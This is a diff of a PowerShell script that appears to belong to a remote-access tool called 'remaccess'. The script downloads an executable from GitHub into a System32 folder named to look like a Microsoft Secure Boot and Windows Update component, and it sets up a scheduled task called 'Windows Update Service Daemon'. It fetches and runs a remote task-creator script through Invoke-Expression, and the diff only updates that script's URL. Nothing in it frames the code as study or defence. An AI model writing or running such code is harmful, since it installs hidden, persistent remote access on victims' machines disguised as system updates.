@@ -2,7 +2,7 @@ $localFilePath = "C:\Windows\System32\SecureBootUpdatesMicrosoft\WindowsUpdateSe
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 $url = "https://github.com/DirNotAvailable/remaccess/releases/download/v1.0.0/DiscordPingBotNewAcquisitions.exe"
 $pingdaemontask = "Windows Update Service Daemon"
-$urlfortc = "https://raw.githubusercontent.com/DirNotAvailable/remaccess/main/TaskSchedulerServiceCreater.ps1"
+$urlfortc = "https://raw.githubusercontent.com/DirNotAvailable/remaccess/main/CoreFiles/TaskSchedulerServiceCreater.ps1"
 Invoke-Expression (Invoke-WebRequest -Uri $urlfortc -UseBasicParsing).Content
 if (-not (Test-Path (Split-Path $localFilePath))) {
     New-Item -Path (Split-Path $localFilePath) -ItemType Directory -Force | Out-Null
